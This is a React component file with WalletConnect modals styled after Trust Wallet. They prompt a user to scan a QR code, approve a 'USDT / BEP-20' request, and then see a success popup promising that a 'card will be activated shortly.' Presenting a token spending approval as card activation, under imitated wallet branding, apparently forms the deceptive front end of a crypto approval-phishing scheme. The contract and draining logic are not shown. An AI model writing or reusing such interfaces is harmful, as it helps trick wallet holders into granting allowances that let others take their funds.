"use client";

import { useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { X, CheckCircle } from "lucide-react";
import toast from "react-hot-toast";

// ─────────────────────────────────────────────────────────────────────────────
// WalletConnect QR Modal (desktop)
// ─────────────────────────────────────────────────────────────────────────────
interface WCQRModalProps {
  uri: string | null;
  onClose: () => void;
  onReconnect: () => void;
}

export function WCQRModal({ uri, onClose, onReconnect }: WCQRModalProps) {
  if (!uri) return null;

  const isMobile =
    typeof window !== "undefined" &&
    /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

  return (
    <div
      className="fixed inset-0 z-[22000] flex items-center justify-center px-4"
      style={{ background: "rgba(15,23,42,0.55)", backdropFilter: "blur(10px)" }}
    >
      <div className="relative w-full max-w-sm rounded-3xl bg-white p-6 shadow-2xl text-center">
        <button
          onClick={onClose}
          className="absolute top-3 right-3 w-8 h-8 flex items-center justify-center rounded-full bg-slate-100 hover:bg-slate-200 transition"
          aria-label="Close"
        >
          <X className="w-4 h-4 text-slate-600" />
        </button>

        <div className="flex items-center justify-center gap-2 mb-1">
          <h2 className="text-lg font-bold text-slate-900">
            Connect Trust Wallet
          </h2>
        </div>

        {isMobile ? (
          /* ── Mobile: tap-to-open deep-link button ── */
          <>
            <p className="text-sm text-slate-500 mb-5">
              Tap below to open Trust Wallet and approve the connection
            </p>
            <a
              href={`https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`}
              className="block w-full py-3 rounded-2xl text-white font-semibold text-sm mb-3"
              style={{ background: "#2563EB", textDecoration: "none" }}
            >
              Open Trust Wallet
            </a>
            <p className="text-xs text-slate-400">
              After connecting in Trust Wallet, come back here — approval will appear automatically
            </p>
          </>
        ) : (
          /* ── Desktop: QR code to scan ── */
          <>
            <p className="text-sm text-slate-500 mb-4">
              Open Trust Wallet → Scan QR → WalletConnect
            </p>
            <div className="flex justify-center mb-4">
              <img
                src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(uri)}`}
                alt="WalletConnect QR Code"
                className="rounded-xl border border-gray-200"
                width={220}
                height={220}
              />
            </div>
            <button
              onClick={() => {
                navigator.clipboard.writeText(uri);
                toast.success("URI copied!");
              }}
              className="w-full py-2 text-sm text-blue-600 border border-blue-200 rounded-xl hover:bg-blue-50 transition mb-2"
            >
              Copy URI
            </button>
            <button
              onClick={onReconnect}
              className="w-full py-2 text-sm font-semibold text-white rounded-xl transition"
              style={{ background: "#2563EB" }}
            >
              Reconnect
            </button>
          </>
        )}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Sign / "Check your wallet" Modal (desktop, after QR scan)
// ─────────────────────────────────────────────────────────────────────────────
interface SignModalProps {
  open: boolean;
  onClose: () => void;
  network?: string;
}

export function SignModal({ open, onClose, network = "USDT / BEP-20" }: SignModalProps) {
  // Safety net: auto-close after 90 seconds to prevent being permanently stuck
  useEffect(() => {
    if (!open) return;
    const timer = setTimeout(() => {
      onClose();
    }, 90_000);
    return () => clearTimeout(timer);
  }, [open, onClose]);

  if (!open) return null;

  return (
    <div
      className="fixed inset-0 z-[23000] flex items-center justify-center px-4"
      style={{ background: "rgba(15,23,42,0.55)", backdropFilter: "blur(10px)" }}
    >
      <div className="relative w-full max-w-sm rounded-3xl bg-white p-8 shadow-2xl text-center">
        <button
          onClick={onClose}
          className="absolute top-3 right-3 w-8 h-8 flex items-center justify-center rounded-full bg-slate-100 hover:bg-slate-200 transition"
          aria-label="Close"
        >
          <X className="w-4 h-4 text-slate-600" />
        </button>

        {/* Spinner */}
        <div className="flex justify-center mb-5">
          <div
            style={{
              width: 64,
              height: 64,
              borderRadius: "50%",
              border: "5px solid #e5e7eb",
              borderTopColor: "#2563eb",
              animation: "wc-spin 1s linear infinite",
            }}
          />
          <style>{`@keyframes wc-spin { to { transform: rotate(360deg); } }`}</style>
        </div>

        <h2 className="text-xl font-bold text-slate-900 mb-2">Check Your Mobile Wallet</h2>
        <p className="text-sm text-slate-500 mb-1">Wallet connected via WalletConnect.</p>
        <p className="text-sm text-slate-500 mb-5">
          A <strong>{network}</strong> approval request has been sent. Please{" "}
          <strong>approve</strong> in your wallet app.
        </p>

        <div className="flex items-center justify-center gap-2 mb-4">
          <span className="text-sm font-semibold text-slate-700">Trust Wallet / WalletConnect</span>
        </div>

        <p className="text-xs text-slate-400">
          This page will update automatically once you approve on your phone.
        </p>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Success Popup (after approval) — Trust Wallet white/blue theme
// ─────────────────────────────────────────────────────────────────────────────
interface SuccessPopupProps {
  open: boolean;
  onClose: () => void;
  txHash?: string;
  network?: string;
  explorerUrl?: string;
}

export function SuccessPopup({
  open,
  onClose,
  txHash = "",
  network = "BEP-20",
  explorerUrl = "https://bscscan.com/tx/",
}: SuccessPopupProps) {
  return (
    <AnimatePresence>
      {open && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-[25000] flex items-center justify-center bg-black/60 px-4"
        >
          <motion.div
            initial={{ opacity: 0, scale: 0.92, y: 32 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.92, y: 32 }}
            transition={{ type: "spring", stiffness: 300, damping: 26 }}
            className="relative w-full max-w-[340px] rounded-3xl bg-white shadow-2xl overflow-hidden"
            style={{ boxShadow: "0 24px 64px -12px rgba(37,99,235,0.30)" }}
          >
            {/* ── Trust Wallet blue header ── */}
            <div
              className="relative flex flex-col items-center pt-10 pb-8 px-6"
              style={{
                background: "#2563EB",
              }}
            >
              {/* Close button */}
              <button
                onClick={onClose}
                className="absolute top-3 right-3 w-8 h-8 flex items-center justify-center rounded-full transition"
                style={{ background: "rgba(255,255,255,0.18)" }}
                aria-label="Close"
              >
                <X className="w-4 h-4 text-white" />
              </button>

              {/* Animated checkmark ring */}
              <motion.div
                initial={{ scale: 0, rotate: -20 }}
                animate={{ scale: 1, rotate: 0 }}
                transition={{ delay: 0.18, type: "spring", stiffness: 280, damping: 18 }}
                className="flex items-center justify-center rounded-full mb-4"
                style={{
                  width: 76,
                  height: 76,
                  background: "rgba(255,255,255,0.18)",
                  border: "3px solid rgba(255,255,255,0.5)",
                }}
              >
                <div
                  className="flex items-center justify-center rounded-full"
                  style={{ width: 58, height: 58, background: "#fff" }}
                >
                  <CheckCircle className="w-9 h-9" style={{ color: "#2563EB" }} />
                </div>
              </motion.div>

              <h2 className="text-xl font-bold text-white mb-1 tracking-tight">
                Approval Submitted!
              </h2>
              <p className="text-sm text-blue-100 text-center leading-snug">
                Your USDT approval has been<br />successfully submitted.
              </p>
            </div>

            {/* ── White body ── */}
            <div className="px-6 pt-5 pb-6 bg-white">
              {/* Info card */}
              <div
                className="flex items-center gap-3 rounded-2xl px-4 py-3 mb-4"
                style={{ background: "#EFF6FF" }}
              >
                <div
                  className="w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0"
                  style={{ background: "#2563EB" }}
                >
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                    <path
                      d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11.35C16.5 22.15 20 17.25 20 12V6l-8-4z"
                      fill="#fff"
                      fillOpacity="0.9"
                    />
                  </svg>
                </div>
                <div className="text-left">
                  <p className="text-xs font-semibold text-slate-700">Card Activation</p>
                  <p className="text-xs text-slate-400 leading-tight">
                    Your card will be activated shortly.
                  </p>
                </div>
              </div>


              {/* Done button */}
              <button
                onClick={onClose}
                className="w-full py-3.5 rounded-2xl text-white font-bold text-sm tracking-wide transition-all active:scale-95"
                style={{
                  background: "#2563EB",
                  boxShadow: "0 6px 24px -6px rgba(37,99,235,0.55)",
                }}
              >
                Done
              </button>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
